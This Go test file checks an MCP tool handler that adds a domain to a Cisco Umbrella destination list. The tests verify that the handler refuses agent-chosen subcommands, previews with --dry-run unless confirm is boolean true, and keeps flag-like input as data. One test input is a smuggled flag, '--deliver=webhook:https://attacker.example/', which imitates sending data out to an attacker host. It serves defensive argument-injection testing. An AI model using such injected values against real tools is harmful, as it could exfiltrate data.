// Copyright 2026 Servosity Inc. and msp-skills contributors. Licensed under Apache-2.0. See LICENSE.

package mcp

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"

	mcplib "github.com/mark3labs/mcp-go/mcp"
)

// argvRecorderEnv makes this test binary print the arguments it was started with
// and exit. It is the recorder TestBlockOneDomainRecipeArgv uses on every OS: the
// generated .bat recorder echoes Windows' raw command line (%*), so it shows the
// quoting Go adds for the child ("[{\"destination\"...") and a CRLF, not the
// argv the CLI receives.
const argvRecorderEnv = "CISCO_UMBRELLA_TEST_ARGV_RECORDER"

func TestMain(m *testing.M) {
	if os.Getenv(argvRecorderEnv) == "1" {
		fmt.Println(strings.Join(os.Args[1:], " "))
		os.Exit(0)
	}
	os.Exit(m.Run())
}

// argvRecorder is this test binary, started as the recorder.
func argvRecorder(t *testing.T) string {
	t.Helper()
	exe, err := os.Executable()
	if err != nil {
		t.Fatalf("test binary: %v", err)
	}
	t.Setenv(argvRecorderEnv, "1")
	return exe
}

// HAND-FIX(mcp-recipe-argv): block_one_domain runs `destination-lists add-destinations`,
// never a subcommand an agent names, and sends only with confirm set to boolean true.
func TestBlockOneDomainRecipeArgv(t *testing.T) {
	oldPath, oldErr := recipeCLIPath, recipeCLIPathErr
	t.Cleanup(func() { recipeCLIPath, recipeCLIPathErr = oldPath, oldErr })
	recipeCLIPath = argvRecorder(t)
	recipeCLIPathErr = nil
	call := func(args map[string]any) (string, bool) {
		t.Helper()
		res, err := handleBlockOneDomain(context.Background(), mcplib.CallToolRequest{Params: mcplib.CallToolParams{Arguments: args}})
		if err != nil {
			t.Fatalf("transport error: %v", err)
		}
		var b strings.Builder
		for _, c := range res.Content {
			if text, ok := c.(mcplib.TextContent); ok {
				b.WriteString(text.Text)
			}
		}
		return b.String(), res.IsError
	}
	body := `[{"destination":"bad.example.com"}]`

	if got, isErr := call(map[string]any{"slug": "delete", "id": "1234567", "body_json": body}); !isErr || !strings.Contains(got, `unknown MCP parameter "slug"`) {
		t.Fatalf("slug must be refused, got error=%v %q", isErr, got)
	}
	for _, confirm := range []any{nil, "true", 1, false} {
		args := map[string]any{"id": "1234567", "body_json": body}
		if confirm != nil {
			args["confirm"] = confirm
		}
		got, isErr := call(args)
		if isErr || !strings.HasPrefix(got, "destination-lists add-destinations 1234567 --body-json="+body+" --dry-run") || !strings.Contains(got, "Preview only") {
			t.Fatalf("confirm=%#v must preview with --dry-run, got error=%v %q", confirm, isErr, got)
		}
	}
	got, isErr := call(map[string]any{"id": "1234567", "body_json": body, "confirm": true})
	if isErr || strings.Contains(got, "--dry-run") || strings.Contains(got, "confirm") || !strings.HasPrefix(got, "destination-lists add-destinations 1234567 --body-json="+body) {
		t.Fatalf("confirm:true must send the add as-is, got error=%v %q", isErr, got)
	}
	got, _ = call(map[string]any{"id": "--deliver=webhook:https://attacker.example/", "body_json": "--x", "confirm": true})
	if !strings.HasPrefix(got, "destination-lists add-destinations --body-json=--x -- --deliver=webhook:https://attacker.example/") {
		t.Fatalf("flag-like values must stay data, got %q", got)
	}
}
